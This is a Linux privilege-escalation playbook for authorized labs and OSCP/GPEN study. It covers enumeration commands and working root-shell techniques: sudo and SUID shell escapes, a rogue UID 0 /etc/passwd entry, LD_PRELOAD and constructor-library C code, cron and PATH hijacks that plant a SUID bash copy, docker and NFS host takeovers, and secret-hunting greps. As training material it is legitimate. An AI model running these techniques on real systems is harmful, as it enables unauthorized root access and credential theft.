# Linux Privilege Escalation Playbook

> **Purpose:** A structured Linux privilege-escalation reference for authorized labs, OSCP-style practice, and GPEN preparation.
>
> **Methodology:** `Enumerate → Identify → Verify → Exploit → Confirm → Document`

Privilege escalation is primarily an enumeration problem. Do not run commands blindly. For every potential path, identify the exact security condition that makes it exploitable.

---

## Table of Contents

1. [Rules of Engagement](#1-rules-of-engagement)
2. [High-Priority Workflow](#2-high-priority-workflow)
3. [Initial Enumeration](#3-initial-enumeration)
4. [Users, Groups, and Credentials](#4-users-groups-and-credentials)
5. [Sudo Misconfigurations](#5-sudo-misconfigurations)
6. [SUID and SGID Executables](#6-suid-and-sgid-executables)
7. [Linux Capabilities](#7-linux-capabilities)
8. [Scheduled Tasks](#8-scheduled-tasks)
9. [Writable Files and Directories](#9-writable-files-and-directories)
10. [PATH Hijacking](#10-path-hijacking)
11. [Environment and Library Hijacking](#11-environment-and-library-hijacking)
12. [Processes and Services](#12-processes-and-services)
13. [Containers and Privileged Groups](#13-containers-and-privileged-groups)
14. [NFS Misconfigurations](#14-nfs-misconfigurations)
15. [Kernel and Local Exploits](#15-kernel-and-local-exploits)
16. [Automated Enumeration](#16-automated-enumeration)
17. [Reusable Lab Payloads](#17-reusable-lab-payloads)
18. [Troubleshooting](#18-troubleshooting)
19. [Exam Quick Reference](#19-exam-quick-reference)
20. [Useful Resources](#20-useful-resources)

---

# 1. Rules of Engagement

Use these techniques only on systems you own or are explicitly authorized to test.

During an exam or engagement:

- Record each command and result.
- Verify prerequisites before exploitation.
- Prefer simple, reliable paths over unstable exploits.
- Avoid unnecessary system changes.
- Back up files before modifying them.
- Clean up artifacts when permitted and required.
- Treat kernel exploits as a late-stage option.

For every finding, answer:

1. What runs with elevated privileges?
2. What can the current user modify?
3. What executes automatically?
4. Which trust boundary is broken?
5. How can the condition be verified safely?

---

# 2. High-Priority Workflow

Use this order after obtaining a shell:

1. Establish user and host context.
2. Check `sudo -l`.
3. Inspect group memberships.
4. Search for credentials and private keys.
5. Enumerate SUID/SGID executables.
6. Enumerate file capabilities.
7. Inspect cron jobs and systemd timers.
8. Inspect root-owned processes and services.
9. Search for writable privileged files.
10. Test PATH and environment weaknesses.
11. Check container and filesystem-related groups.
12. Run automated enumeration and compare results.
13. Consider kernel exploits only after safer paths fail.

---

# 3. Initial Enumeration

## 3.1 Current Identity

```bash
whoami
id
groups
```

Important groups include:

```text
sudo
wheel
docker
lxd
lxc
disk
adm
shadow
systemd-journal
```

Group membership is not automatically exploitable. Determine what access the group grants on the target.

## 3.2 Operating System and Kernel

```bash
hostname
hostnamectl 2>/dev/null
uname -a
uname -r
cat /etc/os-release
cat /proc/version
cat /etc/issue
arch
```

## 3.3 Environment

```bash
env
set
echo "$PATH"
umask
ulimit -a
```

Look for:

- Credentials in environment variables
- Writable directories in `PATH`
- Unusual library variables
- Application-specific secrets
- Proxy or cloud credentials

## 3.4 Network Information

```bash
ip addr
ip route
ip neigh
ss -lntup
ss -antp
cat /etc/hosts
cat /etc/resolv.conf
```

Legacy alternatives:

```bash
ifconfig
route -n
netstat -lntup
```

## 3.5 Mounted Filesystems

```bash
mount
findmnt
df -h
lsblk
cat /etc/fstab
```

Look for:

- Network shares
- Credentials in `/etc/fstab`
- Writable mounted filesystems
- `nosuid`, `noexec`, or `nodev` options
- Unusual application or backup mounts

## 3.6 Running Processes

```bash
ps aux
ps -ef
ps axjf
pstree -ap 2>/dev/null
```

Look for:

- Root-owned custom scripts
- Credentials in command-line arguments
- Backup processes
- Development servers
- Database commands
- Scheduled or recurring execution
- Services launched from writable locations

---

# 4. Users, Groups, and Credentials

## 4.1 Local Users

```bash
cat /etc/passwd
getent passwd
ls -la /home
```

Users with interactive shells:

```bash
awk -F: '$7 !~ /(nologin|false)$/ {print $1, $6, $7}' /etc/passwd
```

## 4.2 Login History

```bash
who
w
last
lastlog
```

## 4.3 Shell History

```bash
history
cat ~/.bash_history 2>/dev/null
cat ~/.zsh_history 2>/dev/null
find /home -maxdepth 2 -type f \( -name ".*history" -o -name "*history*" \) -readable 2>/dev/null
```

## 4.4 SSH Material

```bash
ls -la ~/.ssh
find /home -maxdepth 3 -type f \( -name "id_rsa" -o -name "id_ed25519" -o -name "authorized_keys" -o -name "known_hosts" \) 2>/dev/null
```

Check permissions and ownership:

```bash
find /home -maxdepth 3 -path "*/.ssh/*" -exec ls -l {} \; 2>/dev/null
```

Interesting files include:

```text
id_rsa
id_ed25519
authorized_keys
known_hosts
config
```

## 4.5 Configuration and Secret Search

Targeted searches are usually better than recursively grepping the entire filesystem.

```bash
grep -RniE 'pass(word)?|secret|token|api[_-]?key' /var/www /opt /home 2>/dev/null
find /var/www /opt /home -type f \( -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name "*.yml" -o -name "*.yaml" -o -name "*.env" \) -readable 2>/dev/null
```

Common locations:

```text
/var/www
/opt
/srv
/etc
/home
/var/backups
```

Common files:

```text
.env
config.php
wp-config.php
settings.py
application.properties
database.yml
web.config
*.bak
*.old
*.save
```

## 4.6 Writable `/etc/passwd`

### Vulnerable when

`/etc/passwd` is writable by the current user.

```bash
ls -l /etc/passwd
test -w /etc/passwd && echo "Writable"
```

### Lab exploitation pattern

Back up the file first:

```bash
cp /etc/passwd /tmp/passwd.bak
```

Generate a password hash:

```bash
openssl passwd -6 'LabPassword123!'
```

Append a UID 0 user using the generated hash:

```bash
echo 'labroot:HASH_HERE:0:0:Lab Root:/root:/bin/bash' >> /etc/passwd
```

Then:

```bash
su labroot
id
```

Do not paste `HASH_HERE` literally.

---

# 5. Sudo Misconfigurations

## 5.1 Enumerate

```bash
sudo -l
sudo -V | head
```

Record:

- Allowed commands
- `NOPASSWD`
- Allowed target users
- Wildcards
- Environment settings
- `SETENV`
- `env_keep`
- Secure path configuration

## 5.2 GTFOBins

When an allowed command appears in `sudo -l`, check whether it supports:

- Shell execution
- File reading
- File writing
- Command execution
- Library loading
- Editor escape
- Interpreter execution

Example:

```text
(ALL) NOPASSWD: /usr/bin/find
```

Possible execution:

```bash
sudo /usr/bin/find . -exec /bin/sh \; -quit
```

The same command without `sudo` does not escalate privileges.

## 5.3 Restricted Command Arguments

A sudo rule can restrict exact arguments:

```text
(root) NOPASSWD: /usr/bin/systemctl status example.service
```

Test only the command and arguments permitted by the rule. Do not assume all subcommands are allowed.

## 5.4 Wildcards

Example risky rule:

```text
(root) NOPASSWD: /bin/tar *
```

Wildcards can allow extra command-line options. Determine:

- Which arguments are matched
- Whether option injection is possible
- Which directory the command runs in
- Whether attacker-controlled filenames are processed

## 5.5 Sudo CVE Checks

Check the exact sudo version:

```bash
sudo --version
```

Version alone is not sufficient. Distribution packages may contain backported patches.

For CVE-2019-14287, exploitation also requires a vulnerable sudo release and a rule permitting execution as a non-root user or a user list that can be bypassed. A commonly cited syntax is:

```bash
sudo -u#-1 /bin/bash
```

Verify the sudo rule and patch state before testing.

---

# 6. SUID and SGID Executables

## 6.1 Enumerate

SUID:

```bash
find / -type f -perm -4000 -exec ls -l {} \; 2>/dev/null
```

SGID:

```bash
find / -type f -perm -2000 -exec ls -l {} \; 2>/dev/null
```

Both:

```bash
find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \; 2>/dev/null
```

Focus on:

- Non-standard binaries
- Files under `/opt`, `/usr/local`, or home directories
- Custom applications
- Known GTFOBins
- Recently modified executables

## 6.2 Verify Ownership and Permissions

```bash
ls -l /path/to/binary
file /path/to/binary
stat /path/to/binary
```

A SUID binary must normally be owned by the privileged user whose effective UID is desired.

## 6.3 GTFOBins Examples

The exact technique depends on the binary and how it handles privileges.

Example SUID `find`:

```bash
/path/to/find . -exec /bin/sh -p \; -quit
```

Example SUID Bash:

```bash
/path/to/bash -p
```

The `-p` flag asks Bash to preserve effective privileges. Not every shell or binary behaves the same way.

## 6.4 Custom SUID Binary Analysis

```bash
file /path/to/binary
strings /path/to/binary
ldd /path/to/binary
strace /path/to/binary 2>&1 | less
ltrace /path/to/binary 2>&1 | less
```

Look for:

- Commands invoked without absolute paths
- Missing shared objects
- Writable configuration files
- Writable log files
- Predictable temporary files
- User-controlled environment variables
- Unsafe calls such as `system()`

## 6.5 Shared Object Injection

### Vulnerable when

A privileged executable tries to load a missing library from a location writable by the current user.

Find missing objects:

```bash
strace /path/to/suid-binary 2>&1 | grep -iE 'openat|access|ENOENT|No such file'
```

Example library:

```c
#include <stdlib.h>
#include <unistd.h>

static void inject(void) __attribute__((constructor));

static void inject(void)
{
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", "-p", NULL);
}
```

Compile it into the exact expected path:

```bash
gcc -shared -fPIC -o /writable/path/libmissing.so inject.c
```

Then execute the vulnerable SUID binary.

### Confirm

```bash
id
```

---

# 7. Linux Capabilities

## 7.1 Enumerate

```bash
getcap -r / 2>/dev/null
```

Interesting capabilities include:

```text
cap_setuid
cap_setgid
cap_dac_read_search
cap_dac_override
cap_chown
cap_sys_admin
cap_sys_ptrace
```

## 7.2 `cap_setuid` Interpreter Example

Example finding:

```text
/usr/bin/python3 cap_setuid=ep
```

Potential exploitation:

```bash
/usr/bin/python3 -c 'import os; os.setuid(0); os.execl("/bin/bash","bash","-p")'
```

Confirm:

```bash
id
```

## 7.3 Read-Protected Files

`cap_dac_read_search` or `cap_dac_override` may allow an application to bypass normal file-read restrictions. The exploitation method depends on the capable binary.

Always check the exact binary against trusted references and test its available functions.

---

# 8. Scheduled Tasks

Scheduled execution includes:

- User crontabs
- System cron jobs
- `/etc/cron.*`
- systemd timers
- `at` jobs
- Application schedulers
- Backup scripts

## 8.1 Cron Enumeration

```bash
crontab -l 2>/dev/null
cat /etc/crontab
ls -la /etc/cron*
grep -RniE '^[^#]' /etc/cron* 2>/dev/null
```

User crontabs may be stored in:

```text
/var/spool/cron
/var/spool/cron/crontabs
```

Access depends on permissions.

## 8.2 systemd Timers

```bash
systemctl list-timers --all
```

Inspect a timer and its service:

```bash
systemctl cat example.timer
systemctl cat example.service
```

## 8.3 Vulnerable Conditions

A privileged scheduled task may be exploitable when:

- It executes a writable script.
- It loads a writable configuration file.
- It runs a binary from a writable directory.
- It invokes a command without an absolute path.
- It uses attacker-controlled wildcards.
- It writes to a predictable temporary file.
- A parent directory in the execution path is writable.

## 8.4 Verify the Entire Path

```bash
ls -l /path/to/script.sh
namei -l /path/to/script.sh
stat /path/to/script.sh
```

A file may be non-writable while one of its parent directories is writable.

## 8.5 Observe Recurring Processes

When available in an authorized lab:

```bash
./pspy64
```

This can reveal cron jobs and recurring commands without requiring root.

## 8.6 Root-Owned Writable Script Pattern

When a root cron job executes a script you can modify:

```bash
cat >> /path/to/writable-script.sh <<'EOF'
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF
```

Wait for the scheduled task to run, then verify:

```bash
ls -l /tmp/rootbash
file /tmp/rootbash
/tmp/rootbash -p
id
```

### Important caveats

- The cron job must run as root.
- `/tmp/rootbash` must be owned by root.
- The target filesystem must not be mounted `nosuid`.
- Linux generally ignores SUID bits on shell scripts, so copy the Bash ELF binary rather than creating a script.
- Cron often uses a restricted environment and PATH.

---

# 9. Writable Files and Directories

## 9.1 Broad Searches

Writable files:

```bash
find / -type f -writable 2>/dev/null
```

Writable directories:

```bash
find / -type d -writable 2>/dev/null
```

World-writable directories:

```bash
find / -type d -perm -0002 -exec ls -ld {} \; 2>/dev/null
```

These commands can generate substantial noise. Prioritize privileged execution paths.

## 9.2 High-Value Locations

```text
/etc
/etc/systemd/system
/etc/init.d
/etc/cron.d
/opt
/usr/local/bin
/usr/local/sbin
/var/www
/var/backups
/tmp
/var/tmp
/dev/shm
```

Writable temporary directories are normal and are not findings by themselves.

## 9.3 Root-Owned Files Writable by the Current User

```bash
find / -user root -type f -writable -exec ls -l {} \; 2>/dev/null
```

Investigate:

- Scripts executed by root
- Service unit files
- Service environment files
- Logrotate configurations
- Backup configurations
- Authentication files
- Package hooks
- Application plugins

## 9.4 Parent-Directory Replacement

Even when a file is not writable, a writable parent directory may allow replacement:

```bash
namei -l /path/to/file
```

Whether replacement is possible depends on directory permissions, sticky bits, ownership, and how the privileged process opens the file.

---

# 10. PATH Hijacking

## 10.1 Required Conditions

PATH hijacking requires all or most of the following:

1. A privileged program runs another command.
2. The command is invoked without an absolute path.
3. The privileged program uses an attacker-influenced PATH.
4. The attacker can place an executable earlier in that PATH.
5. The executable is triggered while privileges are retained.

## 10.2 Identify Relative Command Execution

Inspect the application:

```bash
strings /path/to/binary
strace -f /path/to/binary 2>&1
ltrace /path/to/binary 2>&1
```

Example vulnerable C call:

```c
system("tar -czf /tmp/backup.tar.gz /opt/data");
```

Because `tar` is not referenced as `/usr/bin/tar`, command resolution may depend on PATH.

## 10.3 Create a Replacement Command

```bash
cat > /tmp/tar <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF

chmod +x /tmp/tar
export PATH=/tmp:$PATH
```

Execute the vulnerable privileged program, then:

```bash
ls -l /tmp/rootbash
/tmp/rootbash -p
id
```

## 10.4 Common Failure Reasons

- The parent program sanitizes PATH.
- `sudo` uses `secure_path`.
- The command is called with an absolute path.
- The program drops privileges before executing the command.
- The replacement file is not executable.
- The attacker-controlled directory appears too late in PATH.
- The privileged process does not inherit the current shell environment.

---

# 11. Environment and Library Hijacking

## 11.1 Sudo Environment Review

```bash
sudo -l
```

Look for:

```text
SETENV
env_keep
LD_PRELOAD
LD_LIBRARY_PATH
PYTHONPATH
PERL5LIB
```

Modern privileged execution normally strips dangerous environment variables. Exploitation requires a relevant misconfiguration.

## 11.2 `LD_PRELOAD`

### Required condition

`sudo -l` must show that `LD_PRELOAD` can be preserved or explicitly supplied for an allowed sudo command.

Example source:

```c
#include <stdlib.h>
#include <unistd.h>

void _init(void)
{
    unsetenv("LD_PRELOAD");
    setresuid(0, 0, 0);
    setresgid(0, 0, 0);
    execl("/bin/bash", "bash", "-p", NULL);
}
```

Compile:

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
```

Execute an allowed sudo command:

```bash
sudo LD_PRELOAD=/tmp/preload.so /path/to/allowed-command
```

## 11.3 `LD_LIBRARY_PATH`

Inspect linked libraries:

```bash
ldd /path/to/allowed-command
```

Create a malicious shared object with the same name as a required library and place it in a controlled directory.

Example source:

```c
#include <stdlib.h>
#include <unistd.h>

static void hijack(void) __attribute__((constructor));

static void hijack(void)
{
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0, 0, 0);
    setresgid(0, 0, 0);
    execl("/bin/bash", "bash", "-p", NULL);
}
```

Compile using the required library filename:

```bash
gcc -shared -fPIC -o /tmp/libexample.so hijack.c
```

Run the allowed command:

```bash
sudo LD_LIBRARY_PATH=/tmp /path/to/allowed-command
```

This works only when the loader searches the supplied path and the selected library can be replaced without breaking execution before the constructor runs.

---

# 12. Processes and Services

## 12.1 Enumerate Services

```bash
systemctl list-units --type=service --all
systemctl list-unit-files --type=service
service --status-all 2>/dev/null
```

Inspect an individual unit:

```bash
systemctl cat example.service
systemctl show example.service
```

Look for:

- Writable `ExecStart` binaries or scripts
- Writable environment files
- Relative executable paths
- Writable working directories
- Weak service permissions
- Credentials in unit files
- Restart permissions

## 12.2 Service File Locations

```text
/etc/systemd/system
/run/systemd/system
/usr/lib/systemd/system
/lib/systemd/system
/etc/init.d
```

## 12.3 Writable Service Unit

Check:

```bash
ls -l /etc/systemd/system/example.service
namei -l /etc/systemd/system/example.service
```

A modified service only becomes useful when it is reloaded and started or restarted with sufficient privileges:

```bash
sudo systemctl daemon-reload
sudo systemctl restart example.service
```

Do not assume the current user can perform these actions.

## 12.4 Process Command Lines and Open Files

```bash
ps auxww
cat /proc/*/cmdline 2>/dev/null | tr '\0' ' '
```

For a specific process:

```bash
ls -la /proc/PID
cat /proc/PID/cmdline | tr '\0' ' '
cat /proc/PID/environ | tr '\0' '\n' 2>/dev/null
```

Access to another process's environment depends on kernel and mount restrictions.

---

# 13. Containers and Privileged Groups

## 13.1 Docker Group

### Vulnerable condition

Membership in the `docker` group commonly grants control over the Docker daemon, which is usually equivalent to root access on the host.

Check:

```bash
id
docker info
docker images
```

Lab pattern using an available image:

```bash
docker run --rm -it -v /:/mnt IMAGE_NAME chroot /mnt /bin/sh
```

Do not assume `alpine` is available or that the target can reach the internet.

## 13.2 LXD or LXC Group

Check:

```bash
id
lxc list
lxc image list
```

A user able to create privileged containers may be able to mount the host filesystem inside a container. Exact commands depend on installed images, LXD version, and network availability.

## 13.3 Disk Group

Membership in the `disk` group may grant raw access to block devices:

```bash
id
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
lsblk
```

Raw disk access can expose files that normal permissions protect. Handle carefully to avoid filesystem corruption.

## 13.4 `adm` and `systemd-journal`

These groups often provide access to logs rather than direct root access. Logs may still contain:

- Credentials
- Tokens
- Internal paths
- Commands
- Application errors
- Backup locations

```bash
journalctl
find /var/log -type f -readable 2>/dev/null
```

---

# 14. NFS Misconfigurations

## 14.1 Enumerate from the Attacker Host

```bash
showmount -e TARGET_IP
```

## 14.2 Server-Side Configuration

On the target:

```bash
cat /etc/exports
```

The critical option is often:

```text
no_root_squash
```

With `root_squash`, remote root is mapped to an unprivileged identity. With `no_root_squash`, files created as root on the client can retain root ownership on the export.

## 14.3 Lab Exploitation Pattern

Mount the export from an authorized attacker system:

```bash
sudo mount -t nfs TARGET_IP:/export/path /mnt/nfs
```

Create and compile a small SUID helper as root on the attacker system:

```c
#include <stdlib.h>
#include <unistd.h>

int main(void)
{
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", "-p", NULL);
    return 0;
}
```

```bash
gcc nfs-root.c -o /mnt/nfs/nfs-root
sudo chown root:root /mnt/nfs/nfs-root
sudo chmod 4755 /mnt/nfs/nfs-root
```

Execute it from the target through the mounted export path.

### Caveats

- The export must be writable.
- `no_root_squash` must apply.
- The target mount must permit SUID execution.
- Architecture and binary compatibility must match.

---

# 15. Kernel and Local Exploits

Use kernel exploits after configuration-based paths have been exhausted.

## 15.1 Collect Exact Information

```bash
uname -a
uname -r
cat /etc/os-release
cat /proc/version
arch
dpkg -l 2>/dev/null | head
rpm -qa 2>/dev/null | head
```

## 15.2 Search

```bash
searchsploit linux kernel KERNEL_VERSION
```

Automated suggesters can help identify candidates, but their output must be validated.

## 15.3 Validate Before Running

Check:

- Exact kernel build
- Distribution and release
- Architecture
- Backported patches
- Required compiler availability
- Required kernel configuration
- Exploit reliability
- Crash or corruption risk
- Whether the exploit changes system files

Examples commonly encountered in training environments include:

```text
Dirty COW
OverlayFS vulnerabilities
PwnKit
Dirty Pipe
```

Do not assume a named exploit applies solely because the kernel version appears similar.

---

# 16. Automated Enumeration

Common tools:

- linPEAS
- Linux Smart Enumeration
- LinEnum
- Linux Exploit Suggester
- Linux Priv Checker
- pspy

Example:

```bash
chmod +x linpeas.sh
./linpeas.sh
```

Use automated tools to supplement—not replace—manual enumeration.

Review findings by category:

1. Immediate sudo or SUID paths
2. Credentials
3. Scheduled execution
4. Writable privileged files
5. Capabilities
6. Service weaknesses
7. Container groups
8. Kernel candidates

Transfer tools only through methods permitted by the lab or engagement.

---

# 17. Reusable Lab Payloads

These are execution primitives, not vulnerabilities by themselves. They work only when a privileged process executes them under the required conditions.

## 17.1 Root-Owned SUID Bash Copy

```bash
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4755 /tmp/rootbash
```

Execute:

```bash
/tmp/rootbash -p
id
```

Required:

- Commands run as root.
- `/tmp/rootbash` becomes root-owned.
- Filesystem does not use `nosuid`.
- Bash preserves effective privileges with `-p`.

## 17.2 Why a SUID Shell Script Does Not Work

This is not a reliable privilege-escalation payload:

```bash
cat > /tmp/rootbash <<'EOF'
#!/bin/bash
/bin/bash
EOF

chmod 4755 /tmp/rootbash
```

Linux generally ignores SUID bits on interpreted scripts. Use a root-owned ELF executable, such as a copied Bash binary, in an authorized lab.

## 17.3 C SUID Helper

```c
#include <stdlib.h>
#include <unistd.h>

int main(void)
{
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", "-p", NULL);
    return 0;
}
```

Compile:

```bash
gcc root-helper.c -o root-helper
```

For privilege escalation, a privileged context must make the binary root-owned and set its SUID bit:

```bash
chown root:root root-helper
chmod 4755 root-helper
```

Setting SUID on a binary you own does not make it execute as root.

## 17.4 File Read Primitive

When a privileged command can read arbitrary files, prioritize:

```text
/etc/shadow
/root/.ssh/id_rsa
/root/.bash_history
application configuration
backup files
service credentials
```

A file-read primitive can often be safer and more useful than immediately spawning a shell.

## 17.5 File Write Primitive

Potential targets depend on permissions and engagement rules:

```text
authorized_keys
sudoers includes
cron files
service units
application scripts
/etc/passwd
```

Always preserve syntax and permissions. A malformed privileged configuration file can disrupt the host.

---

# 18. Troubleshooting

## 18.1 SUID Bash Does Not Produce Root

Check:

```bash
ls -l /tmp/rootbash
file /tmp/rootbash
stat /tmp/rootbash
findmnt -T /tmp/rootbash
```

Expected:

```text
-rwsr-xr-x root root ...
```

Possible causes:

- The file is not owned by root.
- The SUID bit was set by an unprivileged user on their own file.
- The filesystem is mounted `nosuid`.
- The target is a shell script rather than an ELF executable.
- The shell drops privileges.
- A container runtime or security policy blocks the behavior.

Run:

```bash
/tmp/rootbash -p
id
```

Look for `euid=0(root)`.

## 18.2 Cron Payload Does Not Execute

Check:

```bash
cat /etc/crontab
ls -l /path/to/script
namei -l /path/to/script
date
```

Possible causes:

- Wrong cron syntax
- Wrong user column
- Script is not executable
- Missing shebang
- CRLF line endings
- Relative paths
- Restricted PATH
- Script is not actually executed
- Cron service is not running
- Job has not reached its scheduled time
- Payload command is unavailable
- Output is redirected or discarded

Use absolute paths:

```bash
/bin/cp /bin/bash /tmp/rootbash
/bin/chown root:root /tmp/rootbash
/bin/chmod 4755 /tmp/rootbash
```

## 18.3 PATH Hijack Does Not Trigger

Check:

```bash
echo "$PATH"
type -a COMMAND
which COMMAND
```

Possible causes:

- Absolute path used by the parent program
- PATH reset by sudo or service manager
- Replacement command is not executable
- Wrong filename
- Wrong architecture for a compiled replacement
- Privileges dropped before command execution

## 18.4 Shared Library Injection Fails

Check:

```bash
file /path/to/program
ldd /path/to/program
strace -f /path/to/program 2>&1 | grep -iE 'ENOENT|openat|access'
```

Possible causes:

- Wrong library filename
- Wrong architecture
- Loader ignores the supplied path
- Secure-execution mode strips variables
- Library crashes before the constructor completes
- Missing symbols prevent the program from loading

## 18.5 Python Capability Payload Fails

Check:

```bash
getcap /path/to/python
/path/to/python --version
```

Possible causes:

- Capability belongs to a different interpreter.
- Capability is only in the permitted set.
- Interpreter path is wrong.
- Capability was removed.
- Security policy blocks execution.

---

# 19. Exam Quick Reference

## 19.1 First Commands

```bash
whoami
id
groups
hostname
uname -a
cat /etc/os-release
sudo -l
ip addr
ip route
ss -lntup
ps aux
env
```

## 19.2 Privilege-Bearing Files

```bash
find / -type f -perm -4000 -exec ls -l {} \; 2>/dev/null
find / -type f -perm -2000 -exec ls -l {} \; 2>/dev/null
getcap -r / 2>/dev/null
```

## 19.3 Scheduled Execution

```bash
cat /etc/crontab
ls -la /etc/cron*
systemctl list-timers --all
```

## 19.4 Writable Privileged Resources

```bash
find / -user root -type f -writable -exec ls -l {} \; 2>/dev/null
find /etc /opt /usr/local /var/www -type f -writable -exec ls -l {} \; 2>/dev/null
```

## 19.5 Credentials

```bash
find /home /opt /var/www -type f \( -name "*.conf" -o -name "*.env" -o -name "*.ini" -o -name "*.yml" -o -name "*.yaml" -o -name "*.bak" \) -readable 2>/dev/null
grep -RniE 'pass(word)?|secret|token|api[_-]?key' /home /opt /var/www 2>/dev/null
```

## 19.6 Services and Processes

```bash
ps auxww
systemctl list-units --type=service --all
systemctl list-unit-files --type=service
```

## 19.7 Filesystems

```bash
mount
findmnt
lsblk
cat /etc/fstab
```

## 19.8 Final Questions

```text
What runs as root?
What can I modify?
What executes automatically?
What trusts my environment?
What privileged data can I read?
What privileged process consumes my input?
```

---

# 20. Useful Resources

- GTFOBins: <https://gtfobins.github.io/>
- HackTricks Linux Privilege Escalation: <https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html>
- PayloadsAllTheThings Linux Privilege Escalation: <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation>
- PEASS-ng / linPEAS: <https://github.com/peass-ng/PEASS-ng>
- Linux Smart Enumeration: <https://github.com/diego-treitos/linux-smart-enumeration>
- LinEnum: <https://github.com/rebootuser/LinEnum>
- Linux Exploit Suggester: <https://github.com/mzet-/linux-exploit-suggester>
- pspy: <https://github.com/DominicBreuker/pspy>

---

## Notes Template

Use this template when documenting a finding:

```markdown
## Finding: [Technique Name]

### Enumeration

```bash
COMMAND
```

### Evidence

```text
RELEVANT OUTPUT
```

### Vulnerable Condition

Explain precisely why the configuration is exploitable.

### Verification

```bash
SAFE VERIFICATION COMMAND
```

### Exploitation

```bash
AUTHORIZED LAB COMMAND
```

### Result

```bash
id
```

### Cleanup

List modified or created files and restoration steps.
```
